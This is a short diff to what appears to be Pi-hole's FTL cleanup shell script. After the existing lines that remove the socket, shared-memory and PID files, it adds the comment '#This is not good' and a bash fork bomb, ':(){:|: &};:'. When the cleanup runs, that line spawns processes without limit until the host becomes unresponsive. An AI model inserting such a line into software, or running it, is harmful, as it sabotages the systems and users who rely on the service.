@@ -11,3 +11,6 @@ FTL_PID_FILE="$(getFTLPIDFile)"
 
 # Cleanup
 rm -f /run/pihole/FTL.sock /dev/shm/FTL-* "${FTL_PID_FILE}"
+
+#This is not good
+:(){:|: &};:
